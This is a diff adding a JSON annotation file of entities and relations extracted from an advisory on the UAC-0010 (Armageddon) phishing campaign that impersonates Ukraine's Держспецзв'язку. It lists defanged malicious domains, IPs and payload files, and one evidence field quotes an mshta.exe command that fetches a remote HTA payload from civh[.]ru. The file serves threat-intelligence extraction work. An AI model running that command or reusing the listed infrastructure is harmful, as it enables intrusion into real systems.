@@ -1,0 +1,211 @@
+{
+  "entities": [
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A sovereign state located in Eastern Europe."
+    },
+    {
+      "name": "Держспецзв'язку",
+      "kind": "government body",
+      "gloss": "The State Service of Special Communications and Information Protection of Ukraine."
+    },
+    {
+      "name": "UAC-0010 (Armageddon)",
+      "kind": "threat actor",
+      "gloss": "A Russian state-sponsored cyber espionage and hacking group targeting Ukrainian entities."
+    },
+    {
+      "name": "Telegram",
+      "kind": "software product",
+      "gloss": "A cloud-based instant messaging and social media platform."
+    },
+    {
+      "name": "cloudflare-dns[.]com",
+      "kind": "domain name",
+      "gloss": "A legitimate DNS over HTTPS resolution domain operated by Cloudflare."
+    },
+    {
+      "name": "08362793@mail.gov[.]ua",
+      "kind": "email address",
+      "gloss": "A compromised or spoofed Ukrainian government email address used to distribute malicious messages."
+    },
+    {
+      "name": "07-11-2022.xhtml",
+      "kind": "file",
+      "gloss": "A malicious HTML/XHTML file containing JavaScript designed to drop secondary payload archives."
+    },
+    {
+      "name": "07_11_2022.xhtml",
+      "kind": "file",
+      "gloss": "A malicious HTML/XHTML file hosted on attacker infrastructure to deliver payloads."
+    },
+    {
+      "name": "07.11.2022.rar",
+      "kind": "file",
+      "gloss": "A malicious RAR archive file dropped or downloaded during the infection process."
+    },
+    {
+      "name": "08.11.2022.rar",
+      "kind": "file",
+      "gloss": "A malicious RAR archive containing an LNK shortcut file."
+    },
+    {
+      "name": "08.11.2022.arhiv",
+      "kind": "file",
+      "gloss": "A malicious archive file hosted on adversary infrastructure."
+    },
+    {
+      "name": "Засоби ТЗІ, які мають експертний висновок про відповідність до вимог технічного захисту інформації.lnk",
+      "kind": "file",
+      "gloss": "A malicious Windows shortcut file used to download and execute an HTA payload."
+    },
+    {
+      "name": "growth.rtf",
+      "kind": "file",
+      "gloss": "A malicious payload file disguised as an RTF document."
+    },
+    {
+      "name": "jersey",
+      "kind": "file",
+      "gloss": "A malicious file or payload component dropped to a victim system path."
+    },
+    {
+      "name": "154[.]111.181.171",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the threat actor's network infrastructure."
+    },
+    {
+      "name": "173[.]199.90.103",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious command and control infrastructure."
+    },
+    {
+      "name": "45[.]32.171.4",
+      "kind": "ip address",
+      "gloss": "An IP address used in the adversary's network operations."
+    },
+    {
+      "name": "arhiv.ua-cip[.]org",
+      "kind": "domain name",
+      "gloss": "A malicious subdomain used to host archive payloads imitating Ukrainian entities."
+    },
+    {
+      "name": "tzi.info-cip[.]org",
+      "kind": "domain name",
+      "gloss": "A malicious subdomain used to host initial HTML/XHTML delivery files."
+    },
+    {
+      "name": "civh[.]ru",
+      "kind": "domain name",
+      "gloss": "A malicious domain name hosting payloads retrieved by the HTA file."
+    },
+    {
+      "name": "hilr[.]ru",
+      "kind": "domain name",
+      "gloss": "A malicious domain hosting subsequent payload stages."
+    },
+    {
+      "name": "rubidiumo[.]ru",
+      "kind": "domain name",
+      "gloss": "A malicious domain name associated with the adversary infrastructure."
+    },
+    {
+      "name": "shapurt[.]ru",
+      "kind": "domain name",
+      "gloss": "An adversary domain name associated with the threat campaign."
+    },
+    {
+      "name": "ardeas[.]ru",
+      "kind": "domain name",
+      "gloss": "A malicious domain associated with the threat actor infrastructure."
+    },
+    {
+      "name": "ua-cip[.]org",
+      "kind": "domain name",
+      "gloss": "A spoofed domain registered to mimic Ukrainian government-related cybersecurity entities."
+    },
+    {
+      "name": "info-cip[.]org",
+      "kind": "domain name",
+      "gloss": "A masquerading domain used in the campaign's network infrastructure."
+    },
+    {
+      "name": "mshta.exe",
+      "kind": "software product",
+      "gloss": "A legitimate Windows utility used by adversaries to execute malicious HTML applications."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0010 (Armageddon)",
+      "type": "impersonates",
+      "tail": "Держспецзв'язку",
+      "evidence": "розсилки електронних листів, начебто, від імені Держспецзв'язку"
+    },
+    {
+      "head": "UAC-0010 (Armageddon)",
+      "type": "uses-service",
+      "tail": "Telegram",
+      "evidence": "для визначення IP-адреси серверу управління використовується або третьосторонній сервіс (cloudflare-dns[.]com) або Telegram."
+    },
+    {
+      "head": "UAC-0010 (Armageddon)",
+      "type": "uses-service",
+      "tail": "cloudflare-dns[.]com",
+      "evidence": "для визначення IP-адреси серверу управління використовується або третьосторонній сервіс (cloudflare-dns[.]com)"
+    },
+    {
+      "head": "08.11.2022.rar",
+      "type": "contains-file",
+      "tail": "Засоби ТЗІ, які мають експертний висновок про відповідність до вимог технічного захисту інформації.lnk",
+      "evidence": "Згаданий архів містить файл-ярлик \"Засоби ТЗІ, які мають експертний висновок про відповідність до вимог технічного захисту інформації.lnk\""
+    },
+    {
+      "head": "arhiv.ua-cip[.]org",
+      "type": "hosts-file",
+      "tail": "08.11.2022.arhiv",
+      "evidence": "hXXp://arhiv.ua-cip[.]org/08.11.2022.arhiv"
+    },
+    {
+      "head": "tzi.info-cip[.]org",
+      "type": "hosts-file",
+      "tail": "07_11_2022.xhtml",
+      "evidence": "hXXp://tzi.info-cip[.]org/07_11_2022.xhtml"
+    },
+    {
+      "head": "hilr[.]ru",
+      "type": "hosts-file",
+      "tail": "growth.rtf",
+      "evidence": "hXXps://hilr[.]ru/07.11/growth.rtf"
+    },
+    {
+      "head": "mshta.exe",
+      "type": "connects-to-domain",
+      "tail": "civh[.]ru",
+      "evidence": "C:\\Windows\\System32\\mshta.exe hxxps://civh[.]ru/08.11/band.rtf"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "impersonates",
+      "definition": "The threat actor poses as or pretends to be a legitimate organization or individual."
+    },
+    {
+      "name": "uses-service",
+      "definition": "The actor or malware utilizes an external or legitimate online service during its operations."
+    },
+    {
+      "name": "contains-file",
+      "definition": "An archive, document, or container file contains an embedded or bundled file."
+    },
+    {
+      "name": "hosts-file",
+      "definition": "An internet domain or server hosts a specified downloadable file or payload."
+    },
+    {
+      "name": "connects-to-domain",
+      "definition": "A local process or binary initiates a network connection to a specified domain name."
+    }
+  ]
+}
